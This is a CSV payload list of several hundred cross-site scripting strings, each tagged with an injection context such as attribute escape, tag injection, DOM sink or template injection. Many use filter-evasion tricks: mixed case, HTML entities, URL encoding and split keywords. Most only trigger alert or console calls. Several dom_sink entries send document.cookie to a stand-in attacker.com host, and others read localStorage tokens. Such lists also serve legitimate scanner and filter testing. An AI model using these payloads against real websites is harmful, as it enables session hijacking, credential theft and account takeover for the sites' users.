payload,context
"'><img src=x onanimationstart=alert(String.fromCharCode(88,83,83))>",attribute_escape
onhashchange=javascript:\u0061lert('XSS'),event_handler
"%22 onkeypress=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape
&quot; onfocusin=console.log(location.hash) x=&quot;,attribute_escape
""" ontr&#97;nsitionrun=consol&#101;.log('XSS') """,attribute_escape
' ><svG oNinValId=ProMpt(1)>,attribute_escape
"\"" onh&#97;shch&#97;ng&#101;=prompt('XSS')//",attribute_escape
<scRipT>aLerT(1)</ScrIpt>,script_injection
"""><img src=x ondrop=confirm(document.domain)>",attribute_escape
<embed	onmouseenter=confirm(%27XSS%27)>,tag_injection
<vid&#101;o src=x onclick=consol&#101;.log('XSS')>,tag_injection
"`%3E%3Cimg src=x onreset=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
%3Ctd/onstalled=confirm('XSS')%3E,tag_injection
"javascript:%0aprompt(String.fromCharCode(88,83,83))",js_uri
' onc&#97;npl&#97;y=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
{&#97;l&#101;rt 'XSS'},template_injection
<iframe x=y onsecuritypolicyviolation=confirm('XSS')>,tag_injection
"""%3E%3Cimg src=x onanimationend=confirm(location.hash)%3E",attribute_escape
"""><SelEct onGotPoiNteRcaPtuRe=ConFirM(dOcuMenT.dOmaIn)>",tag_injection
"__proto__[""onplaying""]=confirm(String.fromCharCode(88,83,83))",dom_sink
\' OnpAusE=cOnfIrm(doCumEnt.doMaiN)//,attribute_escape
"\' on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
' %3E%3Csvg onselect=confirm(location.hash)%3E,attribute_escape
&quOt; onTouChmOve=coNfiRm('XSS') x=&quOt;,attribute_escape
"%3Cnoscript onbeforematch=confirm(String.fromCharCode(88,83,83)) onbeforematch=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
%3Cmeta onsecuritypolicyviolation=prompt('XSS')/%3E,tag_injection
%3Cscript%3Econsole.log`document.domain`%3C/script%3E,script_injection
onhashchange=javascr	ipt:confirm('XSS'),event_handler
"""><img src=x onmouseenter=alert(location.hash)>",attribute_escape
'%3E%3Cimg src=x onpromptdismiss=prompt(location.hash)%3E,attribute_escape
<object src=x onvolumechange=\u0061lert(1)>,tag_injection
<title onblur=console.log(location.hash) onblur=console.log(location.hash)>,tag_injection
"\%22 onclose=prompt(String.fromCharCode(88,83,83))//",attribute_escape
"__pRotO__[""oNmoUseDowN""]=evAl('//AttAckEr.Com/?c='+DocUmeNt.CooKie)",dom_sink
""" onfocusin=prompt(1) """,attribute_escape
%22 onpageshow=prompt(document.domain) %22,attribute_escape
""" onwebkitfullscreenchange=prompt('XSS') """,attribute_escape
	onpaste=alert(1),event_handler
"setInterval(%22alert(document.domain)%22,100)",dom_sink
<!--><image onend=prompt(1)>,tag_injection
"window[""&#97;l&#101;rt""](loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink
OnmOusEwhEel=coNsoLe.Log&#40;'XSS'&#41;,event_handler
<noscr	ipt/ongesturestart=alert('XSS')>,tag_injection
""" onfocus=\u0061lert(location.hash) autofocus=""",attribute_escape
'><img src=x onp&#97;g&#101;r&#101;v&#101;&#97;l=consol&#101;.log(1)>,attribute_escape
%3Cscript%3EFunction('prompt(location.hash)')();%3C/script%3E,script_injection
"(neW FUncTioN(""AleRt(BtoA(dOcuMenT.cOokIe))""))();",dom_sink
"""%3E%3Cimg src=x onpagereveal=console.log(document.domain)%3E",attribute_escape
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=confirm(1)>%22)",dom_sink
"<noscr	ipt onbeforematch=confirm(String.fromCharCode(88,83,83)) onbeforematch=confirm(String.fromCharCode(88,83,83))>",tag_injection
"""><img src=x onend=confirm('XSS')>",attribute_escape
"""><img src=x onmousedown=confirm(document.domain)>",attribute_escape
#confirm('XSS'),template_injection
"(new Function(""prompt(document.domain)""))();",dom_sink
""" ><svg onpl&#97;ying=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
<template src=x onclose=console.log(1)>,tag_injection
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=confirm('XSS')>"")",dom_sink
"ObjEct.asSigN(wIndOw,{""oNcaNplAy"":alErt})",dom_sink
"<maTh
OndRagOveR=pRomPt(1)>",tag_injection
"\%27 oncut=console.log(String.fromCharCode(88,83,83))//",attribute_escape
{{aLerT|cOnsTruCtoR:1}},template_injection
<s&#101;l&#101;ct onmous&#101;wh&#101;&#101;l=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)/>,tag_injection
<script	>consol&#101;.log(1)</script>,script_injection
<xmP oNtrAnsItiOneNd=AleRt(LocAtiOn.HasH)/>,tag_injection
&#106;avascr	ipt:confirm(location.hash),js_uri
\' OnwEbkItfUllScrEenChaNge=alErt('XSS')//,attribute_escape
"element.setAttribute(%22onclick%22,%22alert(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22)",dom_sink
"location.href=""javascr	ipt:XMLHttpRequest(navigator.sendBeacon('//attacker.com',document.cookie))""",dom_sink
\%22 ongesturestart=alert(1)//,attribute_escape
	onDraGovEr=ProMpt('XSS'),event_handler
"__proto__[""onbeforetoggle""]=eval('//attacker.com/?c='+document.cookie)",dom_sink
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""confirm(loc&#97;tion.h&#97;sh)""",dom_sink
<scr	ipt>Function('confirm(1)')();</scr	ipt>,script_injection
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=pRomPt(DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)>"")",dom_sink
\' onpl&#97;y=confirm(1)//,attribute_escape
%22><noscript onpaste=confirm(location.hash)>,tag_injection
%22><img src=x onmouseup=console.log(%27XSS%27)>,attribute_escape
__proto__[%22onwheel%22]=XMLHttpRequest(localStorage.getItem(%27token%27)),dom_sink
%22 onpopstate=alert(1) %22,attribute_escape
"OnfUllScrEenChaNge=coNsoLe.Log/**/(STriNg.FroMChArCOde(88,83,83))",event_handler
onmouseover=console.log(1),event_handler
""" ><svg onrepeat=alert(location.hash)>",attribute_escape
ongotpointercapture=prompt/**/(location.hash),event_handler
' ><svg onpopstate=prompt(1)>,attribute_escape
{prOmpT 1},template_injection
<!--><Tr OnpOinTerRawUpdAte=alErt(loCatIon.haSh)>,tag_injection
"__proto__[""ondrop""]=consol&#101;.log(docum&#101;nt.cooki&#101;)",dom_sink
${{prompt(docum&#101;nt.dom&#97;in)}},template_injection
%3Ca x=y onmozfullscreenchange=alert(location.hash)%3E,tag_injection
"\"" oncontextmenu=\u0061lert(1)//",attribute_escape
%27 ontouchstart=prompt(document.domain) %27,attribute_escape
	onw&#101;bkittr&#97;nsition&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler
"__proto__[""ontouchmov&#101;""]=&#101;v&#97;l(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink
""" ><svg onpoint&#101;rdown=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
' onhashchange=confirm(document.domain) ',attribute_escape
onpointerrawupdate=javascript:prompt('XSS'),event_handler
"""><noscr	ipt onpaste=confirm(location.hash)>",tag_injection
"(new Function(%22eval(String.fromCharCode(88,83,83))%22))();",dom_sink
' ><svG oNdrAgeNteR=pRomPt(DocUmeNt.DomAin)>,attribute_escape
OnrEseT=jAvaScrIpt:alErt(doCumEnt.doMaiN),event_handler
"""><img src=x onrepeat=alert(location.hash)>",attribute_escape
""" ><svG oNtrAnsItiOnsTarT=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
<&#101;mb&#101;d/onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
""" on&#101;rror=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape
"`><img src=x onr&#101;p&#101;&#97;t=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
onpageshow=alert/*x*/(%27XSS%27),event_handler
""" onended=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape
{{#with confirm('XSS')}}...{{/with}},template_injection
`><Img srC=x onErrOr=ConFirM(lOcaTioN.hAsh)>,attribute_escape
\' OnpRomPtdIsmIss=prOmpT(1)//,attribute_escape
"""><img src=x ontouchst&#97;rt=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape
"&#101;v&#97;l(""&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink
%3Ca onkeypress=confirm(1)%3E,tag_injection
'%3E%3Cimg src=x onbeforepaste=prompt(1)%3E,attribute_escape
onbeforetoggle=alert&#40;location.hash&#41;,event_handler
%27 ><svg onscrollsnapchange=console.log(1)>,attribute_escape
__proto__[%22onended%22]=console.log(%27XSS%27),dom_sink
<title src=x onmozfullscreenchange=prompt('XSS')>,tag_injection
' ><svg on&#101;rror=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
"__pRotO__[""oNbeForEpaSte""]=EvaL(STriNg.FroMChArCOde(88,83,83))",dom_sink
onmous&#101;&#101;nt&#101;r=confirm/*x*/(loc&#97;tion.h&#97;sh),event_handler
"'%3E%3Cimg src=x onpointerup=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
""" oninvalid=prompt(1) """,attribute_escape
"document.body.innerHTML=""<img src=x onerror=fetch(document.domain)>""",dom_sink
"setInterval(""prompt(document.cookie+'&loc='+location.href)"",100)",dom_sink
"setInterval(%22confirm(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22,100)",dom_sink
<blInk onPopStaTe=ConSolE.lOg(DocUmeNt.DomAin) oNpoPstAte=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection
' ><svG oNfoCusOut=coNfiRm(LocAtiOn.HasH)>,attribute_escape
<table	oncopy=confirm(%27XSS%27)>,tag_injection
"""%3E%3Cplaintext onrepeat=prompt('XSS')%3E",tag_injection
&quot; onclos&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape
"<script>window['confirm'](String.fromCharCode(88,83,83))</script>",script_injection
\' oninvalid=\u0061lert(document.domain)//,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""onmous&#101;down"":&#97;l&#101;rt})",dom_sink
\%27 ontouchstart=confirm(%27XSS%27)//,attribute_escape
<SCRIPT>alert(%27XSS%27)</SCRIPT>,script_injection
"' oNerRor=alErt(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=confirm(String.fromCharCode(88,83,83))%3E"")",dom_sink
\' onsearch=prompt(document.domain)//,attribute_escape
	onanimationstart=\u0061lert('XSS'),event_handler
onpagereveal=confirm&#40;location.hash&#41;,event_handler
<link src=x ondrop=prompt(document.domain)>,tag_injection
' ><svg onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""oncut"":confirm})",dom_sink
[#pRomPt DocUmeNt.CooKie /],template_injection
%3Ctd onsubmit=confirm(document.domain)/%3E,tag_injection
%3Cset src=x onfocus=prompt(document.domain)%3E,tag_injection
""" oNhaShcHanGe=AleRt('XSS') """,attribute_escape
' oNtrAnsItiOneNd=AleRt(1) ',attribute_escape
"""><img src=x onb&#101;for&#101;p&#97;st&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
' ><svG oNcuT=cOnfIrm(1)>,attribute_escape
`><Img srC=x onPopStaTe=AleRt(1)>,attribute_escape
"Object.assign(window,{%22onvolumechange%22:XMLHttpRequest})",dom_sink
%22 ><svg onclick=prompt(%27XSS%27)>,attribute_escape
\' onbeforepaste=console.log('XSS')//,attribute_escape
<auDio	onMouSeoVer=coNsoLe.Log('XSS')>,tag_injection
""" ><svG oNseCurItyPolIcyVioLatIon=coNsoLe.Log(doCumEnt.doMaiN)>",attribute_escape
"EleMenT.sEtATtrIbuTe(""onCliCk"",""eVal(loCalStoRagE.gEtITem('tOkeN'))"")",dom_sink
""" ><svg onpoint&#101;rov&#101;r=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape
<scr	ipt>/*/prompt('XSS')</scr	ipt>,script_injection
OnfOcuSin=coNfiRm&#40;'XSS'&#41;,event_handler
<a onbeforematch=prompt(document.domain)>,tag_injection
`><Img srC=x onBluR=aLerT(dOcuMenT.dOmaIn)>,attribute_escape
"Object.assign(window,{%22ontoggle%22:XMLHttpRequest})",dom_sink
"'><Img srC=x onTouChsTarT=aLerT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
"__proto__[""onpromptdismiss""]=eval('XSS')",dom_sink
%27 oninvalid=confirm(1) %27,attribute_escape
"OnpRomPtdIsmIss=prOmpT(STriNg.FroMChArCOde(88,83,83))",event_handler
""" ongotpointercapture=console.log('XSS') """,attribute_escape
"DatA:tExt/htMl,<scRipT>cOnfIrm(1)</sCriPt>",js_uri
""" ><svg ontouchst&#97;rt=confirm('XSS')>",attribute_escape
"OntRanSitIonStaRt=JavAscRipT:pRomPt(StrIng.frOmCHarCodE(88,83,83))",event_handler
"eval(""confirm(btoa(document.cookie))"")",dom_sink
OnfOcuSouT=cOnfIrm(loCatIon.haSh),event_handler
""" oncontextmenu=alert(document.domain) """,attribute_escape
"""><Img srC=x onWheEl=ConSolE.lOg(LocAtiOn.HasH)>",attribute_escape
"%3Cnoscript	onbeforematch=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
"'%3E%3Cimg src=x onscrollsnapchange=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
onload=javascript:confirm(document.domain),event_handler
' ><svg onwh&#101;&#101;l=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
' ><svg onwheel=prompt('XSS')>,attribute_escape
onreset=alert&#40;document.domain&#41;,event_handler
' oNweBkiTtrAnsItiOneNd=ConFirM(lOcaTioN.hAsh) ',attribute_escape
"""><SouRce onVolUmeChaNge=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
%3Cimage src=x onend=prompt(1)%3E,tag_injection
"javascript:confirm/***/(String.fromCharCode(88,83,83))",js_uri
__proto__[%22onblur%22]=fetch(1),dom_sink
"""><ScrIpt onDblCliCk=ProMpt(1)>",tag_injection
<span onsecuritypolicyviolation=alert(location.hash)>,tag_injection
"""><img src=x onmouseenter=console.log(String.fromCharCode(88,83,83))>",attribute_escape
' onkeypress=alert('XSS') ',attribute_escape
\' onpointerup=alert(1)//,attribute_escape
`><img src=x onpoint&#101;rdown=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
"on&#97;nim&#97;tionit&#101;r&#97;tion=j&#97;v&#97;script:consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"document.body.innerHTML=""%3Cimg src=x onerror=fetch(navigator.sendBeacon('//attacker.com',document.cookie))%3E""",dom_sink
"""%3E%3Cimg src=x onplaying=alert(location.hash)%3E",attribute_escape
&quot; onpromptdismiss=console.log(%27XSS%27) x=&quot;,attribute_escape
"""><img src=x onanimationend=alert(String.fromCharCode(88,83,83))>",attribute_escape
'%3E%3Cimg src=x ontransitionend=alert(document.domain)%3E,attribute_escape
'><img src=x onvolumechange=alert(document.domain)>,attribute_escape
document.body.innerHTML=%22<img src=x onerror=confirm(%27//attacker.com/?c=%27+document.cookie)>%22,dom_sink
`><img src=x onkeypress=confirm('XSS')>,attribute_escape
"location=""javascript:console.log(localStorage.getItem('token'))""",dom_sink
"__proto__[""onc&#97;npl&#97;y""]=&#101;v&#97;l(docum&#101;nt.cooki&#101;)",dom_sink
"""%3E%3Cimage onchange=alert(1)%3E",tag_injection
"java
script:alert(%27XSS%27)",js_uri
"'><img src=x ontouchst&#97;rt=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
\' onplaying=alert(location.hash)//,attribute_escape
""" ><svg ons&#101;&#97;rch=&#97;l&#101;rt('XSS')>",attribute_escape
"window[""eval""](1)",dom_sink
`><img src=x ondragenter=confirm('XSS')>,attribute_escape
&quot; ontouchstart=prompt(document.domain) x=&quot;,attribute_escape
<base x=y oninput=alert(%27XSS%27)>,tag_injection
<liStiNg	OnpOpsTatE=pRomPt(DocUmeNt.DomAin)>,tag_injection
<&#97; x=y onmozfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
<xss onmous&#101;ov&#101;r=consol&#101;.log('XSS') onmous&#101;ov&#101;r=consol&#101;.log('XSS')>,tag_injection
'><Img srC=x onAniMatIonCanCel=prOmpT(lOcaTioN.hAsh)>,attribute_escape
""" ontouchend=console.log(1) """,attribute_escape
"Object.assign(window,{""onwebkitanimationend"":\u0061lert})",dom_sink
j&#97;v&#97;script:consol&#101;.log(1),js_uri
"<soUrcE
oNvoLumEchAngE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
""" ><svg onpoint&#101;rdown=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape
""" oNseArcH=aLerT(1) """,attribute_escape
"'%3E%3Cimg src=x ontransitionstart=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
onpoint&#101;rmov&#101;=j&#97;v&#97;script:&#97;l&#101;rt(docum&#101;nt.dom&#97;in),event_handler
"' ><svg onanimationend=alert(String.fromCharCode(88,83,83))>",attribute_escape
"DatA:tExt/htMl,<scRipT>aLerT(dOcuMenT.dOmaIn)</sCriPt>",js_uri
"""><Img srC=x onBefOreMatCh=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
OncOntExtMenU=jAvaScrIpt:alErt('XSS'),event_handler
"EleMenT.sEtATtrIbuTe(""onCliCk"",""pRomPt('XSS')"")",dom_sink
OnaNimAtiOneNd=AleRt/*x*/(1),event_handler
"__pRotO__[""oNscRolLsnApcHanGe""]=fEtcH(dOcuMenT.cOokIe+'&lOc='+lOcaTioN.hRef)",dom_sink
""" oNenDed=alErt('XSS') """,attribute_escape
' oNanImaTioNitEraTioN=pRomPt(1) ',attribute_escape
' oNtrAnsItiOnrUn=ConSolE.lOg('XSS') ',attribute_escape
"(new Function(""console.log(navigator.sendBeacon('//attacker.com',document.cookie))""))();",dom_sink
\' ongestureend=\u0061lert(1)//,attribute_escape
"oncont&#101;xtm&#101;nu=j&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
%22><img src=x onwaiting=confirm(document.domain)>,attribute_escape
__proto__[%22onauxclick%22]=alert(%27XSS%27),dom_sink
"""><tr ontouchst&#97;rt=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
<image onchange=alert(1)>,tag_injection
%3Cbase x=y onbeforecopy=console.log(location.hash)%3E,tag_injection
""" ><svG oNcuT=aLerT('XSS')>",attribute_escape
<!--><table onselect=confirm(document.domain)>,tag_injection
"\"" onp&#97;g&#101;hid&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)//",attribute_escape
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>""",dom_sink
"Obj&#101;ct.&#97;ssign(window,{""onw&#101;bkit&#97;nim&#97;tion&#101;nd"":f&#101;tch})",dom_sink
"' onpointerup=confirm(String.fromCharCode(88,83,83)) '",attribute_escape
<script>/*/consol&#101;.log(docum&#101;nt.dom&#97;in)</script>,script_injection
OnkEypResS=jAvaScrIpt:prOmpT(1),event_handler
"<td
onk&#101;yup=confirm(docum&#101;nt.dom&#97;in)>",tag_injection
""" ><svg on&#101;nd&#101;d=prompt('XSS')>",attribute_escape
""" ><svg onmouseenter=alert(document.domain)>",attribute_escape
"location=""javascript:console.log('XSS')""",dom_sink
<maTh OndRagOveR=pRomPt(1)>,tag_injection
"%27><img src=x ontouchend=prompt(String.fromCharCode(88,83,83))>",attribute_escape
"__proto__[""ontr&#97;nsition&#101;nd""]=XMLHttpR&#101;qu&#101;st(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink
"%27 ><svg onanimationiteration=alert(String.fromCharCode(88,83,83))>",attribute_escape
"document.write(""<img src=x onerror=\u0061lert('XSS')>"")",dom_sink
"&quOt; onCut=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) x=&qUot;",attribute_escape
<xss on&#101;nd=prompt('XSS') on&#101;nd=prompt('XSS')>,tag_injection
""" ><svg ong&#101;stur&#101;st&#97;rt=&#97;l&#101;rt(1)>",attribute_escape
ong&#101;stur&#101;&#101;nd=confirm('XSS'),event_handler
"""%3E%3Cscript%3Econfirm('XSS')%3C/script%3E",script_injection
j&#97;v&#97;script:consol&#101;.log/*x*/(1),js_uri
"__proto__[""oncopy""]=eval(document.domain)",dom_sink
"""%3E%3Cimg src=x ongotpointercapture=console.log('XSS')%3E",attribute_escape
`%3E%3Cimg src=x oncanplay=console.log(location.hash)%3E,attribute_escape
<b&#97;s&#101; oninput=&#97;l&#101;rt('XSS')/>,tag_injection
__proto__[%22onanimationend%22]=prompt(%27XSS%27),dom_sink
"<s&#101;t
onc&#97;npl&#97;y=confirm(1)>",tag_injection
" onb&#101;for&#101;p&#97;st&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
OnwEbkItaNimAtiOneNd=ConFirM/*X*/(doCumEnt.doMaiN),event_handler
<baSe X=y onKeyDowN=aLerT('XSS')>,tag_injection
OneNd=ProMpt&#40;1&#41;,event_handler
""" %3E%3Csvg onkeydown=alert(location.hash)%3E",attribute_escape
`%3E%3Cimg src=x oncut=confirm(1)%3E,attribute_escape
%22 ><svg onpromptdismiss=console.log(%27XSS%27)>,attribute_escape
%27><img src=x onblur=prompt(%27XSS%27)>,attribute_escape
'><script>consol&#101;.log('XSS')</script>,script_injection
#{prompt(docum&#101;nt.cooki&#101;)},template_injection
"\"" onp&#97;g&#101;r&#101;v&#101;&#97;l=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)//",attribute_escape
onanimationend=console.log(%27XSS%27),event_handler
"' %3E%3Csvg onpointerdown=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
'><img src=x onpromptdismiss=alert('XSS')>,attribute_escape
<taBle/onInvAliD=pRomPt('XSS')>,tag_injection
%22 ongotpointercapture=console.log(%27XSS%27) %22,attribute_escape
"""><meta ontransitionstart=alert(location.hash)>",tag_injection
%3Ctr onselect=console.log(1) onselect=console.log(1)%3E,tag_injection
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""prompt(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink
"' ><svG oNanImaTioNcaNceL=aLerT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
